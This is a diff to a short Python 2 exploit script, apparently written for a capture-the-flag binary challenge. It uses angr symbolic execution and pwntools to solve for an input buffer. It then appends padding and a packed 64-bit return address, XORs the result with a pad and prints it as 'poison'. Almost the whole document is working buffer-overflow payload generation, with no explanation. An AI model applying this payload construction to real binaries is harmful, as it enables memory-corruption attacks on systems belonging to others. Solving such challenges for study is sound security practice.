@@ -1,15 +1,17 @@
+#!/usr/bin/env python2
 import angr
 import find
+import sys
 from pwn import *
 
-tar = 'pwn2'
+tar = sys.argv[1]
 
 # Find dynamic sections in file
 loc = find.get_addresses(tar)
 
 # Create symbolic buffer
 p = angr.Project(tar)
-buf = angr.claripy.BVS("buf",0x40*8)
+buf = angr.claripy.BVS("buf",48*8)
 start_state = p.factory.blank_state(addr=loc['start'])
 start_state.memory.store(loc['buf'], buf)
 
@@ -32,12 +34,9 @@ print f.state
 print f.state.se.any_str(buf).encode('hex')
 
 # Create killstring
-kill_str = f.state.se.any_str(buf)
-kill_str = xor(kill_str, loc['pad'], cut = 'max')
+kill = f.state.se.any_str(buf)
+kill += 'A' * 12
+kill += p64(0x5638d35)
+kill_str = xor(kill, loc['pad'], cut = 'max')
 print 'Here is some poison:'
-print kill_str.encode('hex') + 'a' * 128
-
-
-
-
-
+print kill_str.encode('hex')
